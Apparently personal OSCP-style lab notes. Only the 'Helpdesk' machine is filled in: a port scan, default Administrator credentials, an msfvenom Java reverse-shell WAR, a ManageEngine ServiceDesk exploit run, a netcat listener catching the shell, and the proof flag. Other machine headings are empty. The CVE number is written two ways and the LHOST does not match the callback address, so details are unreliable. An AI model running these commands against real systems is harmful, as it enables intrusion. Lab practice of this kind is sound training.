
## Helpdesk
1. Rustscan 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ rustscan 192.168.235.43

Open 192.168.235.43:135
Open 192.168.235.43:139
Open 192.168.235.43:445
Open 192.168.235.43:3389
Open 192.168.235.43:8080
```

2. Vulnerable with CVE-2024-5301.py for ManageEngine ServiceDesk Plus 7.6.0. 

3. Found default credentials for 8080 login page. (Administrator:Administrator)

4. Execute exploit. 
```
a. Generate msfvenom payload
 msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f war > shell.war

b. Run exploit
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ python3 ./CVE-2014-5301.py 192.168.235.43 8080 administrator administrator shell.war
Trying http://192.168.235.43:8080/bPN9UbHZb6VWNjH7XXS8gxkVOVvCN5vs/giizuehuq/cFyilP9oQl2RnDPh

c. Obatined rever shell
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ nc -nvlp 4444  
listening on [any] 4444 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.235.43] 49192
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\ManageEngine\ServiceDesk\bin>
```

5. Obatined proof.txt
```
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
102edf416b58df65fca770163b2d4252
```




## Access

## Algernon

## Authby

## Craft2

## Heist

## Hutch

## Internal

## Jacko

## Kevin

## Kyoto

## Nara

## Resourced

## Squid